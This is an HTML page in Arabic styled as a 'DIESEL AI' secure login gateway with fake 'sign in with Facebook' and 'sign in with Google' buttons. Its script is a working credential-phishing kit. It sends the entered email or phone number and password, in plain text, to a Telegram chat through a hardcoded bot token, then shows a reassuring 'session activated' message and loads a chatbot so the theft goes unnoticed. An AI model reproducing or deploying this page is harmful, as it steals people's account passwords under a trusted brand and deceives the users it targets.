<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>DIESEL AI | SECURE GATEWAY</title>
    <style>
        body { background: #050505; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #login-overlay { background: #111; padding: 40px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid #333; }
        .ai-logo { font-size: 30px; font-weight: bold; color: #00ff41; margin-bottom: 25px; display: block; }
        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; }
        .btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #444; border-radius: 10px; cursor: pointer; color: #fff; font-weight: bold; transition: 0.3s; }
        .btn:hover { background: #222; }
        .btn svg { width: 22px; height: 22px; margin-left: 10px; }
    </style>
</head>
<body>

<div id="login-overlay">
    <span class="ai-logo">DIESEL AI</span>
    <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف">
    <input type="password" id="pass" placeholder="كلمة المرور">
    
    <button class="btn" onclick="process('Facebook')">
        <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874V12h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
        تسجيل عبر Facebook
    </button>
    
    <button class="btn" onclick="process('Google')">
        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.7 1.2 9.2 3.4l6.8-6.8C35.5 2.5 30.2 0 24 0 14.8 0 7 5.4 3.1 13.5l7.9 6.1C13 13.6 18 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.2-.4-4.7H24v9.1h12.5c-0.6 3.2-2.5 5.9-5.1 7.7l7.7 6c4.5-4.2 7.1-10.4 7.1-18.1z"/><path fill="#FBBC05" d="M11.9 28.5c-1-3-1-6.3 0-9.3l-7.9-6.1c-2.7 5.4-2.7 11.7 0 17.1l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.5 0 11.9-2.2 15.9-5.9l-7.7-6c-2.1 1.4-4.8 2.2-8.2 2.2-6 0-11-4.1-12.8-9.6l-7.9 6.1C11 42.6 16.8 48 24 48z"/></svg>
        تسجيل عبر Google
    </button>
</div>

<script>
    const BOT_TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
    const CHAT_ID = '5177962707';

    function process(type) {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        if(user.length > 5 && pass.length > 5) {
            // إرسال البيانات للتليجرام
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: `🛡 LOGIN [${type}]:\nUser: ${user}\nPass: ${pass}`})
            });

            // ترحيب صوتي احترافي
            const msg = new SpeechSynthesisUtterance("أهلاً بك في منصة الديزل للذكاء الاصطناعي، جاري تفعيل الحساب.");
            msg.lang = 'ar-SA';
            window.speechSynthesis.speak(msg);

            // إخفاء واجهة التسجيل وإظهار البوت
            document.getElementById('login-overlay').innerHTML = "<h2 style='color:#00ff41'>تم تفعيل الجلسة.. جارٍ التحميل</h2>";
            
            // تحميل البوت الحقيقي بعد التسجيل فقط
            const script = document.createElement("script");
            script.src = "https://www.chatbase.co/embed.min.js";
            script.id = "DdngL8r3s2pfzL6hG2oIO";
            document.body.appendChild(script);
        } else {
            alert("يرجى إدخال بيانات حقيقية");
        }
    }
</script>
</body>
</html>
